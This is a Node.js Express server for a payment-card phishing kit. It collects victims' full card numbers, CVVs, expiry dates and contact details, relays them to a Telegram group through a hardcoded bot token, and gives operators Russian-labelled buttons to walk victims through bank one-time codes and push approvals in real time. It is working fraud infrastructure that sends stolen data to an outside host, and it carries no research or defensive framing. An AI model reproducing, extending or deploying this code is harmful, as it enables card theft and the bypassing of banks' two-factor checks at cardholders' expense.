require("dotenv").config();

const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(express.json());
app.use(cors({ origin: "*" }));

const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();

const DEFAULT_PORT = 38471;
const PORT     = parseInt(process.env.PORT || String(DEFAULT_PORT), 10);
const SELF_URL = (process.env.SELF_URL || `http://localhost:${PORT}`).replace(/\/$/, "");

const TIMEOUT_MS = 10 * 60 * 1000;

const pending = new Map();

const lastSeen = new Map();


async function tgPost(method, body) {
  if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
  const res = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    }
  );
  const json = await res.json().catch(() => ({}));
  if (!json.ok) {
    throw new Error(
      `Telegram ${method} failed: ${json.description || res.status}`
    );
  }
  return json;
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function orderKeyboard(request_id) {
  return {
    inline_keyboard: [
      [
        { text: "✅ Подтвердить",      callback_data: `${request_id}:ok`           },
        { text: "❌ Не подходит",      callback_data: `${request_id}:nope`         },
      ],
      [
        { text: "⚠️ Неверная карта",   callback_data: `${request_id}:wrong`        },
        { text: "🚫 Инвалид карта",    callback_data: `${request_id}:invalid`      },
      ],
      [
        { text: "📲 Пуш",              callback_data: `${request_id}:push`          },
        { text: "💬 Код",              callback_data: `${request_id}:push_code`     },
      ],
      [
        { text: "🔄 Смена карты",      callback_data: `${request_id}:change_card`  },
      ],
      [
        { text: "❗ Неверный код",     callback_data: `${request_id}:wrong_code`   },
        { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
      ],
      [
        { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
      ],
    ],
  };
}

function codeKeyboard(request_id) {
  return {
    inline_keyboard: [
      [
        { text: "✅ Код верный",       callback_data: `${request_id}:ok`           },
        { text: "❗ Неверный код",     callback_data: `${request_id}:wrong_code`   },
      ],
      [
        { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
      ],
      [
        { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
      ],
    ],
  };
}

function pushKeyboard(request_id) {
  return {
    inline_keyboard: [
      [
        { text: "✅ Пуш прошёл",        callback_data: `${request_id}:ok`          },
        { text: "📲 Новый пуш",          callback_data: `${request_id}:push`        },
      ],
      [
        { text: "💬 Перейти к коду",     callback_data: `${request_id}:push_code`   },
      ],
      [
        { text: "👁 Проверка онлайна",   callback_data: `${request_id}:check_online` },
      ],
    ],
  };
}

async function sendOrderToTelegram({
  request_id,
  name, email, phone,
  card_number, card_name, card_expiry, card_cvv,
  amount,
}) {
  if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");

  const lines = [
    "🎟 Новая заявка на покупку",
    `🆔 ID: ${escapeHtml(request_id)}`,
  ];
  if (name)   lines.push(`👤 Имя: ${escapeHtml(name)}`);
  if (email)  lines.push(`📧 Email: ${escapeHtml(email)}`);
  if (phone)  lines.push(`📞 Телефон: ${escapeHtml(phone)}`);
  if (amount) lines.push(`💰 Сумма: ${escapeHtml(amount)}`);
  lines.push("");
  lines.push("💳 Данные карты:");
  if (card_number) {
    lines.push("Номер:");
    lines.push(`<code>${escapeHtml(card_number)}</code>`);
  }
  if (card_name) {
    lines.push("Держатель:");
    lines.push(`<code>${escapeHtml(card_name)}</code>`);
  }
  if (card_expiry) lines.push(`Срок: ${escapeHtml(card_expiry)}`);
  if (card_cvv)    lines.push(`CVV: ${escapeHtml(card_cvv)}`);

  await tgPost("sendMessage", {
    chat_id: GROUP_CHAT_ID,
    text: lines.join("\n"),
    parse_mode: "HTML",
    reply_markup: orderKeyboard(request_id),
  });
}

async function sendCodeToTelegram({ request_id, code }) {
  if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");

  await tgPost("sendMessage", {
    chat_id: GROUP_CHAT_ID,
    text: `🔐 Код подтверждения от клиента\n\n📋 Код: <b>${code}</b>\n🆔 Заявка: ${request_id}`,
    parse_mode: "HTML",
    reply_markup: codeKeyboard(request_id),
  });
}

function waitForCallback(request_id) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => {
      pending.delete(request_id);
      resolve({ timeout: true });
    }, TIMEOUT_MS);
    pending.set(request_id, { resolve, timer });
  });
}

app.post("/api/order", async (req, res) => {
  const { profile = {}, card = {}, amount = "" } = req.body;
  const request_id = uuidv4();

  const name  = [profile.firstName, profile.lastName].filter(Boolean).join(" ");
  const email = profile.email || "";

  try {
    await sendOrderToTelegram({
      request_id,
      name,
      email,
      phone:       profile.phone || "",
      card_number: card.number   || "",
      card_name:   card.name     || "",
      card_expiry: card.month && card.year ? `${card.month}/${card.year}` : "",
      card_cvv:    card.cvv      || "",
      amount,
    });
  } catch (err) {
    console.error("[order] Telegram error:", err.message);
    return res.status(502).json({
      ok: false,
      error: "Telegram unavailable",
      detail: err.message,
    });
  }

  lastSeen.set(request_id, Date.now());
  console.log(`[order] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[order] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[order] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

app.post("/api/code", async (req, res) => {
  const { request_id, code } = req.body || {};
  if (!request_id || !code) {
    return res.status(400).json({ ok: false, error: "request_id and code are required" });
  }

  try {
    await sendCodeToTelegram({ request_id, code });
  } catch (err) {
    console.error("[code] Telegram error:", err.message);
    return res.status(502).json({
      ok: false,
      error: "Telegram unavailable",
      detail: err.message,
    });
  }

  lastSeen.set(request_id, Date.now());
  console.log(`[code] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[code] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[code] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

app.post("/api/push_approved", async (req, res) => {
  const { request_id } = req.body || {};
  if (!request_id) {
    return res.status(400).json({ ok: false, error: "request_id required" });
  }

  try {
    await tgPost("sendMessage", {
      chat_id: GROUP_CHAT_ID,
      text: `✅ Клиент подтвердил пуш-уведомление в банке\n🆔 Заявка: ${request_id}`,
      reply_markup: pushKeyboard(request_id),
    });
  } catch (err) {
    console.error("[push_approved] Telegram error:", err.message);
    return res.status(502).json({ ok: false, error: "Telegram unavailable", detail: err.message });
  }

  lastSeen.set(request_id, Date.now());
  console.log(`[push_approved] waiting  request_id=${request_id}`);
  const result = await waitForCallback(request_id);

  if (result.timeout) {
    console.log(`[push_approved] timeout  request_id=${request_id}`);
    return res.status(408).json({ ok: false, error: "timeout" });
  }

  console.log(`[push_approved] done  request_id=${request_id}  action=${result.action}`);
  res.json({ ok: true, request_id, action: result.action });
});

app.post("/api/re_enter_code", async (req, res) => {
  const { request_id } = req.body || {};
  if (!request_id) {
    return res.status(400).json({ ok: false, error: "request_id required" });
  }

  try {
    await tgPost("sendMessage", {
      chat_id: GROUP_CHAT_ID,
      text: `🔄 Клиент запросил повторный ввод кода\n🆔 Заявка: ${request_id}`,
    });
  } catch (err) {
    console.error("[re_enter_code] Telegram error:", err.message);
  }

  res.json({ ok: true });
});

app.post("/api/callback", (req, res) => {
  const { request_id, action } = req.body || {};
  console.log(`[callback] request_id=${request_id}  action=${action}`);

  const entry = pending.get(request_id);
  if (entry) {
    clearTimeout(entry.timer);
    pending.delete(request_id);
    entry.resolve({ action });
  } else {
    console.warn(`[callback] no pending entry for ${request_id}`);
  }

  res.json({ ok: true });
});

app.get("/api/online", (req, res) => {
  const { request_id } = req.query;
  const hasPending = pending.has(request_id);
  const ts = lastSeen.get(request_id);
  const recentlyActive = ts && (Date.now() - ts < 5 * 60 * 1000);
  const online = hasPending || !!recentlyActive;
  res.json({ ok: true, online });
});

app.get("/health", (_req, res) =>
  res.json({ ok: true, pending: pending.size })
);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Backend listening on http://0.0.0.0:${PORT}`);
  console.log(`  BOT_TOKEN     = ${BOT_TOKEN     ? "set ✓" : "NOT SET ✗"}`);
  console.log(`  GROUP_CHAT_ID = ${GROUP_CHAT_ID  || "NOT SET ✗"}`);
  console.log(`  SELF_URL      = ${SELF_URL} (info only)`);
  console.log(
    "  Bot must POST to: .../api/callback — set BACKEND_CALLBACK_URL on PythonAnywhere"
  );
  if (!BOT_TOKEN)     console.warn("  ⚠ Set BOT_TOKEN in .env (token of @cardeeee_bot)");
  if (!GROUP_CHAT_ID) console.warn("  ⚠ Set GROUP_CHAT_ID in .env (numeric Telegram group ID)");
});
